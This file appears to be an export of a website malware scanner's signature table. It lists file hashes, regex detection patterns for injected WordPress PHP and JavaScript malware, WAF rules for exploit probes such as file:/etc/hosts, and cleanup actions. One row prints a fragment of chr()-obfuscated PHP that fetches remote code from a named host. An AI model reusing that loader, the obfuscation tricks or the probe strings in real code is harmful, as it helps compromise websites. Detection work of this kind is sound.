1685,FROM_FA_46167_2022-6-2_11:37:58,'#\@set_time_limit\(3600\);[\n\r]\@ignore_user_abort\(1\);[\n\r]\$xmlname\s=\s''mapssK186.xml[\s\S]{1,33200}CwkT08wMDAwKSkpKTs="\)\);#',CODE_PHP,MALWARE,'2022-06-02 11:38:09','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1687,FROM_FA_46218,a688a6f109a46e3c7e7fd38f6fb57981,FILE,MALWARE,'2022-06-02 11:45:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1689,FROM_FA_46220,a6a88267cc2c8a931ed81ff071eda6c8,FILE,MALWARE,'2022-06-02 11:46:59','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1691,FROM_FA_46222,e722853d5a83ab4fcf879dccf4b150ca,FILE,MALWARE,'2022-06-02 11:51:04','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1693,FROM_FA_46224,9020d430f6bdedfe833a4c0b5cee6c51,FILE,MALWARE,'2022-06-02 11:51:13','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1695,FROM_FA_46358,b0d7cc497f0a544908ef06d001b8d569,FILE,MALWARE,'2022-06-07 11:07:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1697,FROM_FA_46521,6b6635ae194035cec41faa26d8f0fc9a,FILE,MALWARE,'2022-06-20 10:02:21','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1703,FROM_FA_46449,cbc630a5163b165e90e4a08a97fa175f,FILE,MALWARE,'2022-06-20 10:34:08','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1705,FROM_FA_46438,ed3d9b90edd2d5fb7196995d4588d6d5,FILE,MALWARE,'2022-06-20 10:44:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1707,FROM_FA_46436,9a917478fe4982523052727774b699f7,FILE,MALWARE,'2022-06-20 10:44:45','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1709,FROM_FA_46431,7c071c2191a791f1b8c3a94c87dfdf72,FILE,MALWARE,'2022-06-20 10:50:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1711,FROM_FA_46539,304390bd8b5abfab4161c65a9930bd55,FILE,MALWARE,'2022-07-04 16:40:44','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1713,FROM_FA_46541,682b725e5424b822f8a87ffd077ea60c,FILE,MALWARE,'2022-07-04 16:41:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1714,FROM_FA_46570,de657b6cd39b7f349f73c9b6b0794257,FILE,MALWARE,'2022-07-05 10:55:22','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1716,FROM_FA_46572,a765f21f3022dbe7990a82ccddf6b7ab,FILE,MALWARE,'2022-07-05 10:59:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1720,FROM_FA_46591,8e90b88fc9136acdfa5e2d6a8808355a,FILE,MALWARE,'2022-07-05 11:22:46','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1721,FROM_FA_46574,306ede0622babc73665e3b8aeef769a1,FILE,MALWARE,'2022-07-05 15:20:52','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1723,FROM_FA_46931,406638f47b64733759252bf38ab4e687,FILE,MALWARE,'2022-07-08 14:21:42','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1725,FROM_FA_47129,2f43a7160b234182fc9fbe1106eb9cf4,FILE,MALWARE,'2022-07-09 18:16:31','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1727,FROM_FA_47184,02eb9b4b56d806f68f7c41b19d3d1079,FILE,MALWARE,'2022-07-16 13:16:06','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1729,FROM_FA_47228,c00ebdacf6eb1e9982dfe22eb2c48fc1,FILE,MALWARE,'2022-07-16 13:16:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1731,FROM_FA_47232,9abfe27d52078bb63067a6d5cc11c90f,FILE,MALWARE,'2022-07-16 13:17:40','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1732,malware.20.wp.redirects,'#<?php.*?https://scripts.cofounderspecials.com/splash.js.*?\?>#i',CODE_PHP,MALWARE,'2022-07-25 17:36:47','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1733,malware.20.wp.redirects.2,#<script.*?cofounderspecials.com.*?script>#,CODE_PHP,MALWARE,'2022-07-26 13:05:04','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1735,FROM_FA_47352,d27c356be2ee524288bee930c285bd34,FILE,MALWARE,'2022-07-27 13:48:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1737,FROM_FA_47701,df5a65ca4164d2e315d47780f15264c8,FILE,MALWARE,'2022-08-01 14:38:10','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1739,FROM_FA_47766,8d5385c3b71a8f3b7d3e86e93c9809fc,FILE,MALWARE,'2022-08-03 09:38:57','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1740,malware.php.21.bvgeneric.file,d6cfcd2d464d788b75ba6756f2a4665f,FILE,MALWARE,'2022-08-03 13:16:16','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1741,malware.wp.load_code_before_plugin,'#<\?php[\s\S]+?\?>\s+?<\?php\s+\/\*\s+(?>Plugin Name:.+|Plugin URI:.+)[\s\S]+?(?>Plugin Name:.+|Plugin URI:.+)[\s\S]+?\*\/#i',CODE_PHP,MALWARE,'2022-08-03 13:26:54',
1743,malware.wp.wp-vcd,'#<\?php\s+error_reporting\(0\);\s+ini_set\(''display_errors'',\s?0\);\s+\$install_code\s?=\s?''[a-zA-Z0-9]*?='';[\s\S]+<\?php error_reporting\(0\);\?>#',CODE_PHP,MALWARE,'2022-08-03 13:40:23','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1744,malware.21.php.bvgeneric.class,'#<\?php[\s\S]+?class[\s\S][Bb][Vv][Gg]eneric#',CODE_PHP,MALWARE,'2022-08-03 13:52:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1745,malware.wp.wp-vcd.2,'#<\?php\s+if\s\(file_exists\(dirname\(__FILE__\)\s\.\s''\/wp-vcd.php''\)\)\sinclude_once\(dirname\(__FILE__\)\s\.\s?''\/wp-vcd\.php''\);\s?\?>#',CODE_PHP,MALWARE,'2022-08-03 13:56:09','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1746,malware.22.js.clip.js.script.1,'#<\?php[\s\S]+?echo[\s\S]+?<script src=[\s\S]+?https?.*cofounderspecials.*\?>#',CODE_PHP,MALWARE,'2022-08-03 14:07:43','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1748,malware.22.php.base64_decode.obfuscated,'#\$[\w]*[\s]*=[\s]*"[b][."]*?[a][."]*?[s][."]*?[e][."]*?[6][."]*?[4][."]*?[_][."]*?[d][."]*?[e][."]*?[c][."]*?[o][."]*?[d][."]*?[e].*;}?#',CODE_PHP,MALWARE,'2022-08-03 14:57:05','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1750,malware.22.js.clip.js.script.2,'#<\?php[\s\S]+?actual_link[\s\S]+?register_shutdown_function[\s\S]+?<script src=[\s\S]+?https?.*clip\.js\?v=.*</script>#',CODE_PHP,MALWARE,'2022-08-03 15:13:38','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1752,malware.23.js.fromCharCode.obfuscated,'#(/\*trackmyposs\*/){0,}eval\(String\.fromCharCode[\s\S]*?\([\d{1,3},{1}]*\)\);(.*function|inview){2,}.+?;[\r\n]{0,1}#',CODE_JS,MALWARE,'2022-08-03 17:06:45','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1753,FROM_FA_47792,05d4d8c316ee96a838b35410a36c28d4,FILE,MALWARE,'2022-08-04 09:18:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1755,FROM_FA_47794,026685cb390e661896a1a3f67a46e235,FILE,MALWARE,'2022-08-04 09:18:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1757,FROM_FA_47796,b4bff45dcb14f1f581f2d22a54df1cdc,FILE,MALWARE,'2022-08-04 09:19:09','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1759,FROM_FA_47843,a2be0aee894e49689baadb981c7b4ba3,FILE,MALWARE,'2022-08-05 09:15:00','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1760,malware.05082022.1030,'#\*\/\$actualslink = "http:\/\/"\.\$_SERVER\[''HTTP_HOST''].{0,1200}.chr\(116\)\.chr\(62\);}\/\*#',CODE_PHP,MALWARE,'2022-08-05 11:30:08','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1761,FROM_FA_47976,590ccff50bf0a682148bdc552a824842,FILE,MALWARE,'2022-08-08 17:22:20','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1763,FROM_FA_48261,a3dfbf76485d7343d9f25a432d74050f,FILE,MALWARE,'2022-08-15 09:19:20','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1765,FROM_FA_48305,a14cbc7fd4b01323963855b90d5cec5b,FILE,MALWARE,'2022-08-16 09:29:11','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1767,FROM_FA_48316,b45dba8d06866643b87ebfdf8f4955bd,FILE,MALWARE,'2022-08-16 17:00:49','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1769,FROM_FA_48346,42911004738832e94e1376ff241a5dea,FILE,MALWARE,'2022-08-17 09:07:55','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1771,FROM_FA_48364,a6e50206d7a7736a3a13f0caa9b96726,FILE,MALWARE,'2022-08-17 09:14:47','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1773,FROM_FA_48449,65d7b0d7b6bee2ae40771be51ae3c5ee,FILE,MALWARE,'2022-08-18 15:05:29','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1775,FROM_FA_48451,f000508b072724f4b38cb2b25adcf33e,FILE,MALWARE,'2022-08-18 15:05:39','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1777,FROM_FA_48499,cd1cae197396a5c234cd6f2f4dd10595,FILE,MALWARE,'2022-08-22 09:07:37','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1779,FROM_FA_48507,c7c01226e4f8f2d49f7e580bdca168de,FILE,MALWARE,'2022-08-22 09:08:26','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1781,FROM_FA_48515,67e7a1f5e827e86b7932b345e1bcb0a3,FILE,MALWARE,'2022-08-22 09:08:41','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1783,FROM_FA_48624,784a9daff0f67926e9e5c0d001cc5d3b,FILE,MALWARE,'2022-08-22 09:20:28','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1785,FROM_FA_48668,e9310920f44ec49ff1d6e084ff047f41,FILE,MALWARE,'2022-08-22 09:31:07','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1787,FROM_FA_48720,1ca39a73ed000efba9aa0e02f441fd9c,FILE,MALWARE,'2022-08-22 09:32:53','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1789,FROM_FA_48968,f3f5433cececc6d93df2dae184675bee,FILE,MALWARE,'2022-08-23 09:32:24','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1791,FROM_FA_48970_2022-8-23_9:32:43,d3ddbdc10ee15a4d657ba00d7a6d4ca7,FILE,MALWARE,'2022-08-23 09:32:48','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1793,FROM_FA_49092,61c84c3a411c262e450a91b41f801d03,FILE,MALWARE,'2022-08-26 09:17:30','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1795,FROM_FA_49143,c8d44c8ba90f1532ed849f8166a8d6e9,FILE,MALWARE,'2022-08-29 08:54:45','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1796,Test_URL,#eval#,WAF_RULE,XSS,'2022-09-12 10:58:33',
1798,Test_Headers,#eval2#,WAF_RULE,XSS,'2022-09-12 11:10:31',
1799,Test_URL_Headers,#qweasd#,WAF_RULE,XSS,'2022-09-23 11:17:26',
1801,malware.24.php.chr.obfuscated,'#<\?php.*?error_reporting.*chr\(.*?\).*?<script>.*<\/script>.*\?\>#',CODE_PHP,MALWARE,'2022-10-10 12:41:15','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1803,malware.25.php.chr.script.injection,'#\/\*.+Set up the WordPress query.+?\/.*?error_reporting[\s\S]+?wp\(\);#',CODE_PHP,MALWARE,'2022-10-10 16:13:21','{"cci":[{"objects":[{"code":"self"}],"action":{"replace_with":"/*Set up the WordPress query.*/wp();"}}]}'
1804,Case_#463276503.4_HelloThinkCMF,'#a=fetch\&content=die\(@md5\(HelloThinkCMF\)\)#',WAF_RULE,EXPLOIT,'2022-10-14 22:37:55',
1806,Case_#463276503.4_hosts,'#file:\/etc\/hosts#',WAF_RULE,EXPLOIT,'2022-10-14 23:23:34',
1807,FROM_FA_57912,79c3778c90f9ca5a3a911e46ee811813,FILE,MALWARE,'2022-10-18 10:21:58','{"cci":[{"objects":[{"file":"self"}],"action":{"delete":"true"}}]}'
1809,malware.25.php.shell.doorway,'#@ini_set.?\([''"]error_log[''"],.?NULL\).*app\/assets\/api\?action=page.*doorway.*exit\(\);#',CODE_PHP,MALWARE,'2022-10-19 15:21:03','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1811,malware.26.php.base64.eval,'#@set_time_limit\(0\);[\s\S]*\$_REQUEST\[''d_time''\][\s\S]*gzinflate.*base64_decode[\s\S]*eval[\s\S]*;.?\?\>#',CODE_PHP,MALWARE,'2022-10-19 15:49:15','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1812,weatherplllatform__external_js_includer,'#\$a=chr\(98\)\.chr\(97\)\.chr\(115\)\.chr\(101\)\.chr\(54\)\.chr\(52\)\.chr\(95\)\.chr\(100\)\.chr\(101\)\.chr\(99\)\.chr\(111\)\.chr\(100\)\.chr\(101\);[a-zA-Z\d\[\]''"\/<>,.!\-$=;:?._(){}\s]*main\.weatherplllatform\.com\/cdn\.js[?v.\d=]*''><\/script>";}#',CODE_PHP,XSS,'2022-10-26 14:08:30',
1821,obfuscated_inclusion,'#@include\s?\([''"][\w\d\\\/\-.]*\\\d{3}[\w\d\\\/\-.]*[''"]\);#',CODE_PHP,MALWARE,'2022-12-22 18:06:08','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1825,FROM_FA_62850,3ecf370497f0a65090522d84fb455fa6,FILE,MALWARE,'2023-01-04 10:04:22',
1828,stevenfrenanod_php,'$c = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99)."ode"; $d = chr(102).chr(105).chr(108)."e".chr(95)."get".chr(95)."con".chr(116).chr(101).chr(110).chr(116).chr(115); $b = $c($d(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(119).chr(115).chr(46).chr(115).chr(116).chr(105).chr(118).chr(101).chr(110).chr(102).chr(101).chr(114).chr(110).chr(97).chr(110).chr(100).chr(111).chr(46).chr(99).chr(111).chr(109).chr(47).chr(107).chr(106).chr(46).chr(116)',CODE_PHP,MALWARE,'2023-01-13 09:40:17','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1831,FROM_FA_63284,69677cbd368d5d1090fea43ff0bcb2e6,FILE,MALWARE,'2023-01-18 12:52:00',
1865,malware.27.php.shell.cookie_steel,'#class[\s\S]*Apt[\s\S]*\$_COOKIE;[\s\S]*return.*Apt[\s\S]*click[\s\S]*;#',CODE_PHP,MALWARE,'2023-01-31 16:48:06','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
1879,FROM_FA_63811,54c761ebe61aad698a7e39076b3566c8,FILE,MALWARE,'2023-02-08 10:59:10',
1900,malware.27.php.shell.seotheme,'#\$.*\'create\'[\s\S]*\'function\'[\s\S]*g.*z.*.u.*n.*c.*o.*m.*p.*r.*e.s.*.\(\);#',CODE_PHP,MALWARE,'2023-02-20 18:09:57','{"cci":[{"objects":[{"code":"self"}],"action":{"delete":"true"}}]}'
